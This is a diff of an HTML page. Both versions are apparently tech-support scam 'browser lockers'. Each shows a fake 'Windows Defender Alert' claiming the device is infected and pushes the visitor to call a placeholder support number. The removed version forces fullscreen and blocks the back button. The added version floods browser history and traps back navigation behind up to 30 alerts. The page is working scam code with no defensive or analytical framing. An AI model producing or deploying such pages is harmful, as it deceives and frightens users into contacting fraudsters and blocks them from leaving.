@@ -2,85 +2,42 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Security Alert</title>
+  <title>Back Button Lock</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    body {
-      margin: 0;
-      padding: 0;
-      background: black;
+    html, body {
+      background-color: black;
       color: white;
-      font-family: sans-serif;
-    }
-    .fullscreen-alert {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: #111;
-      z-index: 9999;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
       text-align: center;
+      font-family: sans-serif;
+      margin: 0;
       padding: 20px;
     }
-    .fullscreen-alert h2 {
+    h1 {
       color: red;
-      font-size: 24px;
-    }
-    .fullscreen-alert p {
-      font-size: 16px;
-      margin-top: 10px;
-    }
-    #unlockBtn {
-      margin-top: 30px;
-      padding: 10px 20px;
-      font-size: 18px;
-      background: red;
-      border: none;
-      color: white;
-      border-radius: 5px;
     }
   </style>
   <script>
-    // Force fullscreen if browser supports
-    document.addEventListener("click", () => {
-      let el = document.documentElement;
-      if (el.requestFullscreen) el.requestFullscreen();
-    });
+    // Fill browser history to prevent instant exit
+    for (let i = 0; i < 5; i++) {
+      history.pushState({}, '', location.href + '#' + i);
+    }
 
-    // Lock back button
-    history.pushState(null, null, location.href);
+    let backAlertCount = 0;
+
     window.onpopstate = function () {
-      alert("⚠️ Security Warning: You cannot go back!");
-      history.pushState(null, null, location.href);
+      if (backAlertCount < 30) {
+        backAlertCount++;
+        alert(`🚫 Warning ${backAlertCount}/30:\nYou cannot go back!\nCall support immediately.`);
+        history.pushState({}, '', location.href + '#' + Math.random());
+      }
     };
-
-    // Unlock popup only on long press (3s)
-    let holdTimer;
-    function startHold() {
-      holdTimer = setTimeout(() => {
-        document.getElementById("alertBox").style.display = "none";
-        alert("✅ Popup dismissed.");
-      }, 3000); // hold 3 seconds
-    }
-    function cancelHold() {
-      clearTimeout(holdTimer);
-    }
   </script>
 </head>
 <body>
-  <div class="fullscreen-alert" id="alertBox">
-    <h2>⚠️ Windows Defender Alert</h2>
-    <p>Malware has been detected on your device.</p>
-    <p>Call support immediately: <br><strong>+1-800-FAKE-NUM</strong></p>
-    <p>Do not press back. Your data is at risk.</p>
-    <button id="unlockBtn" onmousedown="startHold()" onmouseup="cancelHold()" ontouchstart="startHold()" ontouchend="cancelHold()">
-      Press & Hold 3 sec to Unlock
-    </button>
-  </div>
+  <h1>⚠️ Windows Defender Alert</h1>
+  <p>Your device is at risk!</p>
+  <p>Call technical support immediately: <strong>+1-800-FAKE-NUM</strong></p>
+  <p>Pressing back is blocked 30 times as a protection.</p>
 </body>
 </html>
